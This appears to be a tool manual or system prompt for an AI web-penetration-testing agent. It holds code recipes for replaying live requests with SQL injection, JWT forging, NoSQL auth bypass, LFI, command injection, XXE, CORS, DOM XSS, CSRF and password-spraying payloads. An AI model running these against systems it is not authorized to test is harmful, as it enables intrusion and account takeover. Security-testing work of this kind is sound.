...
You are inside `proxy_brain`: you write Python, and `whitehat` is pre-imported.
`whitehat` is your ONLY I/O — the corpus of captured HTTP traffic and the live
...
that technique: `print(whitehat.manual("jwt"))`, `whitehat.manual("sqli")`, etc.
...
- `whitehat.search(filters=None, **kwargs) -> [Txn]` — HTTP history. Pass a dict
...
- `whitehat.get(id, part="response") -> str` — full headers+body of ONE txn.
  part = "request" | "response" | "both".
- `whitehat.sitemap() -> str` — distinct host+path+method observed, with counts.
- `whitehat.params() -> str` — distinct request params + a type guess (seq-id/uuid/jwt/base64).
- `whitehat.grep(pattern, limit=50) -> str` — substring search over response bodies + snippet.
- `whitehat.diff(id_a, id_b) -> str` — structural diff of two responses (status/len/headers/body).
- `whitehat.to_curl(id) -> str` — render a captured request as a runnable curl (PoC).
- `whitehat.query(spec) -> str` — constrained analytics over the traffic table (dict spec:
...
- `whitehat.decode(value) -> str` — peel base64/url/hex/gzip layers to readable text.
- `whitehat.jwt(token) -> Jwt` — `.header`, `.payload` (dicts), and
  `.forge(alg_none=True | secret="s" | claims={...}) -> str` (HS256 / alg:none).

ACTIVE (LIVE TRAFFIC — see LIMITS below):
- `whitehat.replay(id, mutate=None) -> Response` — resend a captured request with
...
- `whitehat.batch(id, mutations, parallel=False) -> [Response]` — replay once per
  mutation. `parallel=True` fires them CONCURRENTLY (real race window).
- `whitehat.fuzz(id, insertion_point, payloads) -> [Response]` — iterate payloads
...
- `whitehat.browser(id) -> Browser` — a real chromium PINNED to the host of txn
...
RESULT:
- `whitehat.finding(kind, txn_id, evidence=None, severity="medium")` — record a finding.
- `whitehat.emit(text)` / `print(...)` — what returns to you. Print DISTILLED lines only.
...
|---|---|
| HTTP history / site map | `whitehat.search(...)`, `whitehat.sitemap()`, `whitehat.query(...)` |
| Resend a request with tweaks | `whitehat.replay(id, {...})` |
| Payload fuzzing sweep | `whitehat.fuzz` or loops over `whitehat.replay`; see `manual("intruder")` |
| Compare two responses | `whitehat.diff(a, b)` (and compare `.length`/`.body`/`.status` in code) |
| Token entropy analysis | collect a token N times, compute entropy in Python; see `manual("sequencer")` |
| Decode / forge tokens | `whitehat.decode(v)`, `whitehat.jwt(tok).forge(...)` |
| Access-control diffing | replay every request under a 2nd identity, `diff` vs baseline; `manual("authz")` |
| Concurrent race testing | `whitehat.batch(id, [...]*N, parallel=True)`; `manual("race")` |
...
| Post-JS / DOM / client-side signal | `whitehat.browser(id)` then `.dom()`/`.alerts()`/`.console()`; `manual("browser")` |
...
```python
print(whitehat.sitemap())                       # what endpoints exist (host+path+method)
print(whitehat.params())                         # params + injectability guess (seq-id/uuid/jwt/base64)
for t in whitehat.search(only5xx=True):          # servers already erroring = soft spots
    print(t.raw)
print(whitehat.grep("error|exception|stack", 30))# leaked internals
print(whitehat.grep("eyJ"))                       # JWTs in bodies/JS
# analytics: top hosts by 5xx
print(whitehat.query({"select":[{"col":"host"},{"agg":"count","as":"n"}],
                     "where":[{"col":"status_code","op":">=","val":500}],
                     "group_by":["host"],"order_by":[{"as":"n","dir":"desc"}],"limit":20}))
```
Everything downstream needs a `Txn.id` from here. `whitehat.get(id,"both")` shows the
...
- **Sniper** (one position, many payloads): `whitehat.fuzz(id, "param", payloads)`.
- **Battering ram** (same payload in many positions): loop `replay` setting each
  position to the SAME value: `whitehat.replay(id, {"param":{"a":p,"b":p}})`.
...
for p in payloads: r = whitehat.replay(id, {"headers": {"X-Forwarded-For": p}})
# body/JSON field
for p in payloads: r = whitehat.replay(id, {"body": '{"q":"%s"}' % p})
# path segment
for p in payloads: r = whitehat.replay(id, {"path": "/api/item/%s" % p})
```
...
```python
import re
for r in whitehat.fuzz(id, "id", ["1","2","0","-1","1 OR 1=1","1'"]):
...
```python
import re
t = whitehat.search(path="/api/check")[0]
def truthy(cond):
    r = whitehat.replay(t.id, {"param": {"id": f"1 AND ({cond})"}})
...
whitehat.finding("sqli", t.id, severity="high")
```
...
```python
for t in whitehat.search(session="sess_owner"):
    base = whitehat.replay(t.id, {})                        # owner baseline (a Response — same shape as below)
    if base.status not in (200, 201):
        continue                                           # only test requests that actually returned data
    unauth = whitehat.replay(t.id, {"dropHeaders": ["Cookie", "Authorization"]})
    low    = whitehat.replay(t.id, {"cookie": "session=<low_priv_cookie>"})
    for who, r in (("unauth", unauth), ("lowpriv", low)):
        if r.status == base.status and r.body == base.body:  # weaker identity got the SAME data
            whitehat.finding("bola", t.id, evidence=r, severity="high")
            print("LEAK", who, t.id)
```
...
```python
t = whitehat.search(hasAuth=True)[0]
tok = whitehat.get(t.id, "request")                       # lift the Bearer/cookie token
import re; m = re.search(r'(eyJ[\w-]+\.[\w-]+\.[\w-]*)', tok); j = whitehat.jwt(m.group(1))
...
for label, ft in [("none", none_tok), ("weak", forged)]:
    r = whitehat.replay(t.id, {"headers": {"Authorization": f"Bearer {ft}"}})
    print(label, r.status, "ACCEPTED" if r.status == 200 else "rejected")
    if r.status == 200: whitehat.finding("jwt-"+label, t.id, evidence=r, severity="critical")
```
...
```python
t = whitehat.search(path="/redeem")[0]
resps = whitehat.batch(t.id, [{}] * 20, parallel=True)     # 20 identical, concurrent
ok = sum(1 for r in resps if r.status == 200 and "success" in r.body.lower())
print("successes:", ok, "(>1 on a single-use action = race)")
if ok > 1: whitehat.finding("race-limit-overrun", t.id, severity="high")
```
...
IMPORTANT: `whitehat.replay` CANNOT detect smuggling. A desync needs raw, ambiguous
...
for t in whitehat.search(method="POST"):
    resp = whitehat.get(t.id, "response").lower()
    if any(k in resp for k in ("via", "x-cache", "cf-ray", "x-served-by", "x-forwarded")):
        print("smuggling candidate (fronted):", t.id, "->", whitehat.to_curl(t.id).splitlines()[-1])
```
2) CONFIRM with a tool that preserves byte framing, run via `kali_shell` (NOT whitehat):
...
if "rdmn<svg/onload=1>" in r.body:
    whitehat.finding("xss", t.id, evidence=r, severity="high")
# SSTI: math that only a template engine evaluates
r = whitehat.replay(t.id, {"param": {"q": "rdmn{{7*7}}"}})
if "rdmn49" in r.body: whitehat.finding("ssti", t.id, evidence=r, severity="critical")
...
r = whitehat.replay(t.id, {"param": {"next": "//evil.example"}})
if "evil.example" in (r.headers.get("location") or ""): whitehat.finding("open-redirect", t.id, severity="medium")
...
print(whitehat.grep("api[_-]?key|secret|AKIA|-----BEGIN", 30))  # secrets in bodies/JS
...
toks = []
for _ in range(40):
    r = whitehat.replay(login_txn_id, {})
...
```python
import re
step1 = whitehat.get("clx-form-txn")                     # the page that mints the token
csrf = re.search(r'name="csrf"\s+value="([^"]+)"', step1).group(1)
r = whitehat.replay("clx-submit-txn", {"body": f"new_password=Hacked1!&csrf={csrf}"})
...
```python
whitehat.finding("idor", txn_id, evidence=resp, severity="high")  # structured, goes to your output
print(whitehat.to_curl(txn_id))                                   # reproducible PoC for the write-up
```
...
```python
import re
t = whitehat.search(path="/api/login", method="POST")[0]
base = whitehat.replay(t.id, {})                                   # normal (likely 401)
# auth bypass: match ANY non-null user + pass
r = whitehat.replay(t.id, {"headers": {"Content-Type": "application/json"},
                          "body": '{"username":{"$ne":null},"password":{"$ne":null}}'})
if r.status in (200, 302) and r.status != base.status:
    whitehat.finding("nosql-auth-bypass", t.id, evidence=r, severity="critical")
...
```python
import re
g = whitehat.search(path="/graphql", method="POST") or whitehat.search(bodyq="query")
t = g[0]
ct = {"Content-Type": "application/json"}
# 1) introspection — dump the whole schema (the attack-surface map)
r = whitehat.replay(t.id, {"headers": ct, "body": '{"query":"query{__schema{types{name fields{name}}}}"}'})
if "__schema" in r.body:
    whitehat.finding("graphql-introspection", t.id, evidence=r, severity="medium")
# 2) field suggestion — works even with introspection OFF: a wrong field leaks valid names
r = whitehat.replay(t.id, {"headers": ct, "body": '{"query":"query{userr{id}}"}'})
...
r = whitehat.replay(t.id, {"headers": ct, "body": json.dumps({"query": "mutation{%s}" % aliases})})
```
...
```python
import re
t = whitehat.search()[0]                                          # a request with a file-ish param
for pl in ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
           "/etc/passwd", "....//....//etc/passwd"]:
    r = whitehat.replay(t.id, {"param": {"file": pl}})
    if "root:x:0:0" in r.body:
        whitehat.finding("lfi", t.id, evidence=r, severity="high"); print("LFI:", pl); break
# PHP source disclosure -> decode the base64 blob, it starts with <?php
r = whitehat.replay(t.id, {"param": {"file": "php://filter/convert.base64-encode/resource=index.php"}})
m = re.search(r'[A-Za-z0-9+/]{40,}={0,2}', r.body)
if m and whitehat.decode(m.group(0)).lstrip().startswith("<?php"):
    whitehat.finding("lfi-source-disclosure", t.id, evidence=r, severity="high")
```
...
for sep in [f";echo {mark}", f"|echo {mark}", f"&&echo {mark}", f"$(echo {mark})", f"`echo {mark}`"]:
    r = whitehat.replay(t.id, {"param": {"host": "127.0.0.1" + sep}})
    if mark in r.body:
        whitehat.finding("cmdi", t.id, evidence=r, severity="critical"); print("CMDI:", sep); break
# blind: a sleep that delays the response confirms execution (OAST/DNS exfil unavailable)
s = time.time(); whitehat.replay(t.id, {"param": {"host": "127.0.0.1;sleep 5"}}); dt = time.time() - s
if dt > 4.5: whitehat.finding("cmdi-blind", t.id, severity="critical")
```
...
```python
t = whitehat.search(hasAuth=True)[0]
r = whitehat.replay(t.id, {"headers": {"Origin": "https://evil.example"}})
acao = r.headers.get("access-control-allow-origin", "")
acac = r.headers.get("access-control-allow-credentials", "")
if acao == "https://evil.example" and acac.lower() == "true":
    whitehat.finding("cors-origin-reflection", t.id, evidence=r, severity="high")   # creds-readable cross-origin
r = whitehat.replay(t.id, {"headers": {"Origin": "null"}})                          # sandboxed-iframe/data: trick
if r.headers.get("access-control-allow-origin") == "null":
    whitehat.finding("cors-null-origin", t.id, evidence=r, severity="medium")
```
...
```python
t = whitehat.search(method="POST")[0]                            # an XML endpoint (Content-Type xml)
xxe = ('<?xml version="1.0"?>'
       '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
       '<r>&x;</r>')                                            # wrap in whatever field the app echoes
r = whitehat.replay(t.id, {"headers": {"Content-Type": "application/xml"}, "body": xxe})
if "root:x:0:0" in r.body:
    whitehat.finding("xxe-file-read", t.id, evidence=r, severity="critical")
...
```python
t = whitehat.search(path="/login", method="POST")[0]
fail = whitehat.replay(t.id, {}).status                          # baseline failed-login status
# password spray: ONE password across many users (dodges per-account lockout)
for u in ["admin", "root", "test", "user1"]:
    r = whitehat.replay(t.id, {"param": {"username": u, "password": "Winter2026!"}})  # mutate.body for JSON
    if r.status in (200, 302) and r.status != fail:
        whitehat.finding("weak-credentials", t.id, evidence=r, severity="high"); print("HIT", u)
# session fixation: does the session id CHANGE after login? if not -> fixation
pre  = whitehat.replay(t.id, {}).headers.get("set-cookie", "")
post = whitehat.replay(t.id, {"param": {"username": "valid", "password": "valid"}}).headers.get("set-cookie", "")
if pre and post and pre.split(";")[0] == post.split(";")[0]:
    whitehat.finding("session-fixation", t.id, severity="medium")
...
t = whitehat.search(host="target.tld")[0]        # any captured txn on the host
b = whitehat.browser(t.id)
b.goto("/profile#name=<img src=x onerror=alert(1)>")   # payload in the hash, read by JS
if b.alerts():                                          # a dialog fired -> executed
    whitehat.finding("dom-xss", t.id, evidence=str(b.alerts()), severity="high")
b.close()
```
...
b.close()
r = whitehat.replay(t.id, {"param": {"csrf": token, "email": "attacker@evil.tld"}})
```
